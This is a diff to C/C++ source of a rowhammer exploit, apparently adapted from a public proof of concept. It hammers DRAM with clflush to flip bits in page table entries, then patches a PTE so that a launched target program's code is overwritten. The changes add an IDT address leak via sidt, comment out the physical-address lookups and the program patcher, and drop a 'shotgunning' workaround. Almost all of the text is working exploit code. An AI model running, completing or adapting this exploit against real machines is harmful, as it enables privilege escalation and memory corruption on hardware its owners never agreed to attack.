@@ -1,4 +1,5 @@
 
+
 #include <assert.h>
 #include <elf.h>
 #include <errno.h>
@@ -20,7 +21,7 @@
 // Modifications:
 // Memory size - change memory size to use up a majority of available memory (~80%)
 // Since Linux kernel 4.0, userspace processes are no longer allowed to read /proc/{PID}/pagemap
-// hence, modifying code to not call physical page number translations and instead shotguns.
+// hence, modifying code to not call physical page number translations 
 
 const size_t memory_size = ((size_t) 900 * 6 ) << 20;
 
@@ -45,18 +46,27 @@ struct HammerAddrs {
   uint64_t victim;
 };
 
+static struct {
+  uint16_t limit;
+  uint64_t addr;
+} __attribute__((packed)) idt;
+
+//packed means that it will use the smallest possible space
+// for idt, no padding is done. 
+
 void mount_proc() {
   int rc = mkdir("/proc", 0777);
   assert(rc == 0);
   rc = mount("", "/proc", "proc", 0, NULL);
   assert(rc == 0);
 }
-//54 or 55.
+
 // Extract the physical page number from a Linux /proc/PID/pagemap entry.
 uint64_t frame_number_from_pagemap(uint64_t value) {
   return value & ((1ULL << 54) - 1);
 }
 
+//Don't use this.
 uint64_t get_physical_addr(uintptr_t virtual_addr) {
   int fd = open("/proc/self/pagemap", O_RDONLY);
   assert(fd >= 0);
@@ -108,6 +118,7 @@ public:
     assert(phys_addrs);
 
     printf("PhysPageFinder: Build page map...\n");
+
     int fd = open("/proc/self/pagemap", O_RDONLY);
     assert(fd >= 0);
     ssize_t read_size = sizeof(phys_addrs[0]) * num_pages;
@@ -150,6 +161,11 @@ public:
 
 void clflush(uintptr_t addr) {
   asm volatile("clflush (%0)" : : "r" (addr) : "memory");
+}
+
+void IDTaddr(){
+  asm volatile("sidt %0" : "=m" (idt));
+  printf("IDT Addr = 0x%lx\n", idt.addr);
 }
 
 class BitFlipper {
@@ -211,7 +227,7 @@ public:
       clflush(agg2);
     }
   }
-
+  //TODO: Remove dependencies on physical addresses.
   bool find_pages(PhysPageFinder *finder) {
     return (finder->find_page(phys->agg1, &agg1) &&
             finder->find_page(phys->agg2, &agg2) &&
@@ -285,6 +301,10 @@ BitFlipper *find_bit_flipper(const char *addrs_file) {
   PhysPageFinder finder;
   for (size_t i = 0; i < flip_addrs.size(); i++) {
     const struct HammerAddrs *addrs = &flip_addrs[i];
+
+	//TODO: Findpages uses physical addresses.
+	// can we do away with finding pages?
+
     BitFlipper *flipper = new BitFlipper(addrs);
     bool found = flipper->find_pages(&finder);
     printf("Entry %zi: 0x%09llx, 0x%09llx, 0x%09llx - %s\n", i,
@@ -292,9 +312,8 @@ BitFlipper *find_bit_flipper(const char *addrs_file) {
            (long long) addrs->agg2,
            (long long) addrs->victim,
            found ? "found" : "missing");
-	   // shotgunning
-	   found = true;
-    if (found) {
+    
+   if (found) {
       if (flipper->initial_hammer()) {
         int bit = flipper->get_bit_number();
         // Is this bit flip useful for changing the physical page
@@ -315,6 +334,7 @@ BitFlipper *find_bit_flipper(const char *addrs_file) {
   exit(1);
 }
 
+//IGNORE TEST MODE//
 void flip_bit() {
   printf("Test mode: Flipping bit at address %llx...\n",
          (long long) g_victim_phys_addr);
@@ -333,6 +353,7 @@ void flip_bit() {
   int written = pwrite(g_mem_fd, &val, sizeof(val), g_victim_phys_addr);
   assert(written == sizeof(val));
 }
+//END IGNORE//
 
 class Fragmenter {
   static const size_t reserve_size = memory_size;
@@ -402,8 +423,9 @@ void init_dev_mem() {
   int *mem = (int *) mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
   // mem is a virtual address.
-  // TODO Do we need `got`?
+  // TODO Do we need `got`? Seems like it's just an informational check.
   assert(mem != (int *) MAP_FAILED);
+  /*
   for (int i = 0; i < 10; i++) {
     *mem = i;
     int val = 0;
@@ -412,6 +434,8 @@ void init_dev_mem() {
     assert(got == sizeof(val));
     assert(val == i);
   }
+  */
+
   rc = munmap(mem, page_size);
   assert(rc == 0);
 }
@@ -528,7 +552,8 @@ asm(".pushsection .text, \"ax\", @progbits\n"
     "template_end:\n"
     ".popsection\n");
 
-
+//TODO: CAN'T USE THIS //
+/*
 class ProgPatcher {
   uintptr_t virt_addr;
   uint64_t phys_addr;
@@ -551,12 +576,18 @@ public:
     virt_addr = prog_data + ehdr->e_entry - load_start;
 
     //TODO Remove this, and stop checking for the modification.
+    
     phys_addr = get_physical_addr(virt_addr);
     // Check that we only need to modify one page.
     assert(phys_addr / page_size == (phys_addr + template_size()) / page_size);
+    
+
   }
 
   void patch(uint64_t *pte, char *page) {
+	//TODO: Need to know where exactly to page.
+	// Hence physical addresses are needed. 
+	//
     uint64_t page_number = phys_addr / page_size;
     uint32_t offset_in_page = phys_addr % page_size;
     *pte = (page_number << 12) | 0x27; //27->07
@@ -565,10 +596,13 @@ public:
     memcpy(page + offset_in_page, template_start, template_size());
   }
 };
+*/
+// END // 
 
 void main_prog(int test_mode, const char *addrs_file) {
   if (test_mode)
     mount_proc();
+  IDTaddr();
   ProcessLauncher launcher;
   BitFlipper *flipper = NULL;
   if (!test_mode)
@@ -586,9 +620,10 @@ void main_prog(int test_mode, const char *addrs_file) {
   int flip_offset_page = flip_offset_bytes / 8;
   printf("flip_offset_page=%i\n", flip_offset_page);
 
-  // The number of the bit in the PTE that flips.
-  int flip_bit_number =
-    test_mode ? test_bit_to_flip : flipper->get_bit_number();
+  //TODO: Do we need this?  The number of the bit in the PTE that flips.
+  
+  //int flip_bit_number =
+  //  test_mode ? test_bit_to_flip : flipper->get_bit_number();
 
   size_t target_pt_size;
   size_t target_mapping_size;
@@ -696,22 +731,27 @@ void main_prog(int test_mode, const char *addrs_file) {
       // that the kernel allocated for us.
       printf("Out of %i page tables per mmap():\n",
              (int) (file_size / large_page));
+	
       for (size_t offset = 0; offset < file_size; offset += large_page) {
+	//TODO: Can remove this. required_bit_val is mostly for info only.
+	/*
         uintptr_t virt_addr = ((uintptr_t) mapped + offset +
                                flip_offset_page * page_size);
 
-	//TODO: Can remove this. required_bit_val is mostly for info only.
+	
         uint64_t phys_addr = get_physical_addr(virt_addr);
         int required_bit_val = ((phys_addr >> flip_bit_number) & 1) ^ 1;
         printf("  Page table %zi requires flip to %i: address is 0x%llx\n",
                offset / large_page, required_bit_val, (long long) phys_addr);
+	*/
+
       }
     }
   }
 
   int status = launcher.launch_target_prog();
   assert(status == 44 << 8);
-  ProgPatcher patcher;
+  //ProgPatcher patcher;
 
   if (test_mode) {
     flip_bit();
@@ -755,7 +795,7 @@ void main_prog(int test_mode, const char *addrs_file) {
           printf("  Points to 0x%llx\n", (long long) val);
 
           uint64_t old_pte = addr[2];
-          patcher.patch(&addr[2], (char *) addr2 + page_size);
+          //patcher.patch(&addr[2], (char *) addr2 + page_size);
           addr[2] = old_pte; // Restore old PTE.
           int status = launcher.launch_target_prog();
 	   printf(" Status = %i \n" , status);
